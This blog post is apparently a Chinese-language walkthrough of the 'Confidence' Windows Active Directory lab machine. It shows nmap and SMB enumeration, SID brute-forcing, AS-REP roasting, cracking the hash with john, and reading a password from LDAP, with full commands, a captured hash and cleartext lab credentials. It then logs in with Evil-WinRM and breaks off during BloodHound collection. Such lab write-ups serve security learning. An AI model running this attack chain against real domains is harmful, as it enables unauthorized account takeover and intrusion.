
<!DOCTYPE html><html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
  
  
  <meta name="generator" content="Hexo 8.1.1">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  <meta name="theme-color" content="#f9fafb">
  <title>Confidence靶机-Maze-windows - Hexo</title>

  
    <meta name="description" content="Confidence靶机-Maze-windows-ESC1">
<meta property="og:type" content="article">
<meta property="og:title" content="Confidence靶机-Maze-windows">
<meta property="og:url" content="http://example.com/2025/09/12/posts/confidence/">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Confidence靶机-Maze-windows-ESC1">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/confidence/1.png">
<meta property="article:published_time" content="2025-09-11T16:00:00.000Z">
<meta property="article:modified_time" content="2025-09-12T06:05:10.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="ldap">
<meta property="article:tag" content="windows">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/confidence/1.png">
  
  
  
  <meta name="keywords" content="windows,ldap">

  <!-- feed -->
  

  <link rel="stylesheet" href="/css/main.css?v=1.33.1">


  

  

  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"dateCreated":"2025-09-12T00:00:00+08:00","dateModified":"2025-09-12T14:05:10+08:00","datePublished":"2025-09-12T00:00:00+08:00","description":"Confidence靶机-Maze-windows-ESC1","headline":"Confidence靶机-Maze-windows","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/09/12/posts/confidence/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://example.com/2025/09/12/posts/confidence/","keywords":"windows, ldap","image":[]}</script>
  <link rel="stylesheet" href="/custom/css/self.css"><link rel="stylesheet" href="/custom/css/self.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
</head>
<body><div id="l_cover">

</div><div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://i.bobopic.com/small/128905928.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Starrui777-zone</div><div class="sub normal cap">天天都有好心情</div><div class="sub hover cap" style="opacity:0"> 天天都可以摸猫</div></a></div></header>

<div class="nav-area">

<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="笔记" href="/notebooks/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FF1493"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a></nav>
</div>
<div class="widgets">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>



<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/01/20/posts/bt2-lesuo/"><span class="title">勒索事件排查-青少年</span></a><a class="item title" href="/2026/01/19/posts/bt1/"><span class="title">公交车事件排查靶机-青少年</span></a><a class="item title" href="/2026/01/23/posts/dream/"><span class="title">上班的生活-记录开始</span></a><a class="item title" href="/2025/11/04/posts/memory/"><span class="title">JAVA-内存马+servlet+Filter</span></a><a class="item title" href="/2025/10/29/posts/cc/"><span class="title">JavaEECC1链条持续更新+fastjson1.2.24+log4j</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Starrui777/Starrui777.github.io/tree/main" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" href="https://music.163.com/#/playlist?id=369828878" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/3845874.svg"/></a><a class="social" href="https://space.bilibili.com/107029949?spm_id_from=333.1007.0.0" target="_blank" rel="external nofollow noopener noreferrer"><img src="/icon/bilibili.svg" /></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2025-09-11T16:00:00.000Z">2025-09-12</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2025-09-12T06:05:10.000Z">2025-09-12</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>Confidence靶机-Maze-windows</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h2 id="Confidence靶机-Maze-windows-ESC1"><a href="#Confidence靶机-Maze-windows-ESC1" class="headerlink" title="Confidence靶机-Maze-windows-ESC1"></a>Confidence靶机-Maze-windows-ESC1</h2><span id="more"></span> 

<h3 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h3><p>NMAP扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> nmap -sT -sC -p- 192.168.10.132 </span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">| ssl-cert: Subject: commonName=dc.confidence.com</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.confidence.com</span><br><span class="line">| Not valid before: 2025-09-09T12:14:33</span><br><span class="line">|_Not valid after:  2026-09-09T12:14:33</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">| ssl-cert: Subject: commonName=dc.confidence.com</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.confidence.com</span><br><span class="line">| Not valid before: 2025-09-09T12:14:33</span><br><span class="line">|_Not valid after:  2026-09-09T12:14:33</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=dc.confidence.com</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.confidence.com</span><br><span class="line">| Not valid before: 2025-09-09T12:14:33</span><br><span class="line">|_Not valid after:  2026-09-09T12:14:33</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line">59557/tcp open  unknown</span><br><span class="line">59558/tcp open  unknown</span><br><span class="line">59565/tcp open  unknown</span><br><span class="line">59574/tcp open  unknown</span><br><span class="line">59580/tcp open  unknown</span><br><span class="line">59610/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:F7:7B:D8 (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-09-11T06:05:46</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_nbstat: NetBIOS name: DC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:f7:7b:d8 (VMware)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3.1.1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: -3s</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 247.87 seconds</span><br><span class="line">扫描完写入到hosts里面</span><br></pre></td></tr></table></figure>

<p>先测试smb有无共享文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└─# crackmapexec smb 192.168.10.132 -u &#x27;&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">SMB         192.168.10.132  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:confidence.com) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         192.168.10.132  445    DC               [+] confidence.com\: </span><br><span class="line">SMB         192.168.10.132  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line"># smbclient -L //192.168.10.132                     </span><br><span class="line">Password for [WORKGROUP\root]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      远程管理</span><br><span class="line">        C$              Disk      默认共享</span><br><span class="line">        IPC$            IPC       远程 IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        readme          Disk      </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 192.168.10.132 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现一个readme看看呢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─# smbclient //192.168.10.132/readme </span><br><span class="line">Password for [WORKGROUP\root]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Tue Sep  9 09:25:09 2025</span><br><span class="line">  ..                                DHS        0  Tue Sep  9 09:28:52 2025</span><br><span class="line">  readme.txt.txt                      A      273  Tue Sep  9 09:25:11 2025</span><br><span class="line"></span><br><span class="line">                12923135 blocks of size 4096. 7950004 blocks available</span><br><span class="line">smb: \&gt; get readme.txt.txt </span><br><span class="line">没发现什么信息</span><br><span class="line">└─# cat /root/readme.txt.txt </span><br><span class="line">I&#x27;ve already disabled Windows Defender, and the system updates have been completed. So, enjoy exploring! If you run into any issues or get stuck, feel free to reach out to me, Wackymaker. My intention is simply to make sure everyone can learn something from this experience  </span><br></pre></td></tr></table></figure>

<p>smb可以匿名试试 lookid获取下用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">─# lookupsid.py lucy@192.168.10.132</span><br><span class="line">/usr/local/lib/python3.10/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Brute forcing SIDs at 192.168.10.132</span><br><span class="line">[*] StringBinding ncacn_np:192.168.10.132[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-3649830887-1815587496-1699028491</span><br><span class="line">498: CONFIDENCE\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: CONFIDENCE\Administrator (SidTypeUser)</span><br><span class="line">501: CONFIDENCE\Guest (SidTypeUser)</span><br><span class="line">502: CONFIDENCE\krbtgt (SidTypeUser)</span><br><span class="line">512: CONFIDENCE\Domain Admins (SidTypeGroup)</span><br><span class="line">513: CONFIDENCE\Domain Users (SidTypeGroup)</span><br><span class="line">514: CONFIDENCE\Domain Guests (SidTypeGroup)</span><br><span class="line">515: CONFIDENCE\Domain Computers (SidTypeGroup)</span><br><span class="line">516: CONFIDENCE\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: CONFIDENCE\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: CONFIDENCE\Schema Admins (SidTypeGroup)</span><br><span class="line">519: CONFIDENCE\Enterprise Admins (SidTypeGroup)</span><br><span class="line">520: CONFIDENCE\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: CONFIDENCE\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: CONFIDENCE\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: CONFIDENCE\Protected Users (SidTypeGroup)</span><br><span class="line">526: CONFIDENCE\Key Admins (SidTypeGroup)</span><br><span class="line">527: CONFIDENCE\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">553: CONFIDENCE\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: CONFIDENCE\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: CONFIDENCE\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1000: CONFIDENCE\DC$ (SidTypeUser)</span><br><span class="line">1101: CONFIDENCE\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: CONFIDENCE\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1103: CONFIDENCE\ca-admin (SidTypeGroup)</span><br><span class="line">1104: CONFIDENCE\ca-user (SidTypeUser)</span><br><span class="line">1105: CONFIDENCE\mulis (SidTypeUser)</span><br><span class="line">1106: CONFIDENCE\hyh (SidTypeUser)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现用户hyh mulis ca-user </p>
<p>然后用GetNPUsers.py 获取没有开启域认证的账号hash 成功获取mulis的然后用john解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#GetNPUsers.py -usersfile /root/maze/conficenceuser.txt -no-pass -dc-ip  192.168.10.132 confidence.com/</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] User hyh doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">$krb5asrep$23$mulis@CONFIDENCE.COM:9757a526f685d1240449b7ccf2a4d87a$23f2b38d42eeddd793a20f980ab86d8e24807e64a9eeacef107b2e38258a8d154f8c8bc7ca17362af2ef366cd0fa87139a8f797a9b36ac1f478925688cbc16dd75d448e5a36a2da41c2dc8bd328ad51a2183b40c8d2e07386e79903d6a7cd021d4b549b774ea8f6c746f7551ca68dd5c93dd8779652c7995107c7bedd3d5521560c39f904c8cfd5e5ccf4b4625dd0ae684eebc34b0342fb654705d3965528c8edbac29ac6f2c2aa867e851b5df7a1a139e4f1a821ca7704b986dd400d6c53795b25639375d761c4ec6f46f96bb695b7123d6fc545930f3a8cd7104c75ab82fcf776831e1cfaea248a50a758bba1e5e9d</span><br><span class="line">[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#john --wordlist=/usr/share/wordlists/rockyou.txt  /root/maze/hash</span><br><span class="line">babygirl         ($krb5asrep$23$mulis@CONFIDENCE.COM)    </span><br></pre></td></tr></table></figure>

<p>拿到后不知道干嘛了因为用evil登录不上去问问作者说查看ldap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.10.132 -D &quot;mulis@confidence.com&quot; -w babygirl -b &quot;DC=confidence,DC=com&quot; &quot;(objectClass=user)&quot; sAMAccountName memberOf description servicePrincipalName</span><br><span class="line"></span><br><span class="line">获取hyh有下面一串</span><br><span class="line"># hyh, Users, confidence.com</span><br><span class="line">dn: CN=hyh,CN=Users,DC=confidence,DC=com</span><br><span class="line">description:: 6L+Z5p2h6Lev5piv5a+555qE77yM5L2G5piv5L2g55yL5Yiw55qE6L+Y5LiN5aSf</span><br><span class="line"> 5aSa</span><br><span class="line">memberOf: CN=Remote Management Users,CN=Builtin,DC=confidence,DC=com</span><br><span class="line">sAMAccountName: hyh</span><br><span class="line">base64后转换为utf-8得到不全面 意思我们ldap不全换命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.10.132 -D &quot;mulis@confidence.com&quot; -w babygirl -b &quot;CN=hyh,CN=Users,DC=confidence,DC=com&quot; &quot;*&quot;</span><br><span class="line"></span><br><span class="line">获得密码</span><br><span class="line">info: Password: 3948571026</span><br><span class="line">登录获得user</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\hyh&gt; cd Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\hyh\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: C:\Users\hyh\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----          9/9/2025   9:28 PM             34 user.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="rootflag"><a href="#rootflag" class="headerlink" title="rootflag"></a>rootflag</h3><p>这里用bloodhound获取信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u hyh -p &quot;3948571026&quot; -d confidence.com -ns 192.168.10.132 -c All --zip</span><br><span class="line">INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: confidence.com</span><br><span class="line">INFO: Getting TGT for user</span><br><span class="line">INFO: Connecting to LDAP server: dc.confidence.com</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.confidence.com</span><br><span class="line">INFO: Found 7 users</span><br><span class="line">INFO: Found 53 groups</span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc.confidence.com</span><br><span class="line">INFO: Done in 00M 